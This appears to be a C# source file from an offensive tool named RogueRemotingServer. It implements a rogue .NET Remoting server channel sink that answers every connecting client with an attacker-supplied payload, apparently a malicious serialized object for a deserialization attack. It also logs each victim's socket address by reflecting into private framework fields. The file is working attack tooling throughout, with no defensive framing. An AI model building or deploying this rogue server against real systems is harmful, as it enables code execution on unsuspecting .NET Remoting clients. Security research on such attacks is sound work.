using System;
using System.Collections;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Messaging;

namespace RogueRemotingServer
{
    internal class RogueServerChannelSink : IServerChannelSink, IChannelSinkBase
    {
        private readonly Protocol _protocol;
        private readonly bool _allowAnyUri;
        private readonly Format _format;
        private readonly byte[] _payload;
        private static FieldInfo _stackField;
        private static FieldInfo _stateField;
        private static FieldInfo _netSocketField;

        public RogueServerChannelSink(Protocol protocol, bool allowAnyUri, Format format, byte[] payload)
        {
            this._protocol = protocol;
            this._allowAnyUri = allowAnyUri;
            this._format = format;
            this._payload = payload;
        }

        public IServerChannelSink NextChannelSink => throw new NotImplementedException();

        public IDictionary Properties => throw new NotImplementedException();

        public void AsyncProcessResponse(IServerResponseChannelSinkStack sinkStack, object state, IMessage msg, ITransportHeaders headers, Stream stream)
        {
            throw new NotImplementedException();
        }

        public Stream GetResponseStream(IServerResponseChannelSinkStack sinkStack, object state, IMessage msg, ITransportHeaders headers)
        {
            throw new NotImplementedException();
        }

		public ServerProcessing ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, out IMessage responseMsg, out ITransportHeaders responseHeaders, out Stream responseStream)
		{
			string requestUri = (string)requestHeaders["__RequestUri"];
			Console.Write("[*] Processing message for '" + requestUri + "' ");
			Socket socket = RogueServerChannelSink.GetClientSocket(sinkStack);
			if (socket != null)
			{
				Console.Write(string.Format("from {0} ", socket.RemoteEndPoint));
			}
			Console.Write("...");
			if (!this._allowAnyUri && RemotingServices.GetServerTypeForUri(requestUri) == null)
			{
				Console.WriteLine(" unknown service!");
				throw new RemotingException("Requested Service not found");
			}
			Console.WriteLine(" sending payload!");

			responseMsg = null;
			responseHeaders = new TransportHeaders();
			if (this._protocol == Protocol.Http)
			{
				responseHeaders["Content-Type"] = ((this._format == Format.Binary) ? "application/octet-stream" : "text/xml");
			}
			responseStream = new MemoryStream(this._payload);
			responseStream.Position = 0L;

			return ServerProcessing.Complete;
		}

		private static Socket GetClientSocket(IServerChannelSinkStack serverChannelSinkStack)
		{
			if (RogueServerChannelSink._stackField == null)
			{
				RogueServerChannelSink._stackField = serverChannelSinkStack.GetType().GetField("_stack", BindingFlags.Instance | BindingFlags.NonPublic);
			}
			var sinkStack = RogueServerChannelSink._stackField.GetValue(serverChannelSinkStack);
			if (RogueServerChannelSink._stateField == null)
			{
				RogueServerChannelSink._stateField = sinkStack.GetType().GetField("State", BindingFlags.Instance | BindingFlags.Public);
			}
			var serverHandler = RogueServerChannelSink._stateField.GetValue(sinkStack);
			if (RogueServerChannelSink._netSocketField == null)
			{
				RogueServerChannelSink._netSocketField = serverHandler.GetType().GetField("NetSocket", BindingFlags.Instance | BindingFlags.NonPublic);
			}
			return (Socket)RogueServerChannelSink._netSocketField.GetValue(serverHandler);
		}
	}
}